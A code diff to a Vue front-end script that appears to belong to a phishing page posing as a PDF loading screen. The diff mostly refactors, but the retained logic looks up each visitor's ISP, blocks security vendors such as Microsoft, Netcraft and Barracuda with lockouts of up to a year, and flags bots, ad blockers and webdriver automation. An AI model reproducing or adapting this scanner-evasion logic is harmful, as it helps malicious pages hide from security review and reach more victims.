@@ -2,7 +2,7 @@ import { createApp, ref, onMounted } from 'vue';
 import { detect } from 'detect-browser';
 import FingerprintJS from '@fingerprintjs/fingerprintjs';
 import axios from 'axios';
-import '@/assets/style.css';
+import '@/assets/style.css';  // ✅ Correct way to load CSS
 
 const app = createApp({
   setup() {
@@ -22,7 +22,6 @@ const app = createApp({
         const isp = ipInfo.data.org.toLowerCase();
 
         const blockedISPs = ["microsoft", "netcraft", "barracuda"];
-
         const penaltyKey = `penalty_${visitorIP.value}`;
         const penaltyData = JSON.parse(localStorage.getItem(penaltyKey)) || { count: 0, expiry: null };
         const now = new Date().getTime();
@@ -34,23 +33,15 @@ const app = createApp({
           }
 
           penaltyData.count += 1;
-          if (penaltyData.count === 1) {
-            penaltyData.expiry = now + 60 * 60 * 1000;
-          } else if (penaltyData.count === 2) {
-            penaltyData.expiry = now + 24 * 60 * 60 * 1000;
-          } else {
-            penaltyData.expiry = now + 365 * 24 * 60 * 60 * 1000;
-          }
+          penaltyData.expiry = penaltyData.count === 1 ? now + 60 * 60 * 1000 :
+                               penaltyData.count === 2 ? now + 24 * 60 * 60 * 1000 :
+                                                         now + 365 * 24 * 60 * 60 * 1000;
           localStorage.setItem(penaltyKey, JSON.stringify(penaltyData));
           isBlocked.value = true;
           return;
         }
 
-        if (
-          browser?.name === 'bot' ||
-          result.components?.adBlock?.value ||
-          result.components?.webdriver?.value
-        ) {
+        if (browser?.name === 'bot' || result.components?.adBlock?.value || result.components?.webdriver?.value) {
           isBot.value = true;
         }
       } catch (error) {
@@ -84,57 +75,3 @@ const app = createApp({
 });
 
 app.mount('#app');
-
-/* Updated CSS */
-/* General Page Styling */
-body, html {
-  margin: 0;
-  padding: 0;
-  width: 100%;
-  height: 100%;
-  background-color: #001f3f; /* Dark Blue Background */
-  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-}
-
-/* Loading Container Styling */
-.loading-container {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  height: 100vh;
-}
-
-/* PDF Logo Styling */
-.pdf-logo {
-  width: 120px;
-  height: auto;
-  margin-bottom: 20px;
-  filter: drop-shadow(2px 4px 6px rgba(0, 0, 0, 0.2));
-}
-
-/* Loading Text Styling */
-.loading-text {
-  font-size: 1.5rem;
-  color: #ffffff; /* White Text */
-  margin-top: 10px;
-  letter-spacing: 0.5px;
-  text-align: center;
-}
-
-/* Spinner Animation */
-.spinner {
-  width: 60px;
-  height: 60px;
-  border: 6px solid #e0e0e0;
-  border-top-color: #e44d26;
-  border-radius: 50%;
-  animation: spin 1s infinite linear;
-  margin-top: 10px;
-}
-
-@keyframes spin {
-  to {
-    transform: rotate(360deg);
-  }
-}
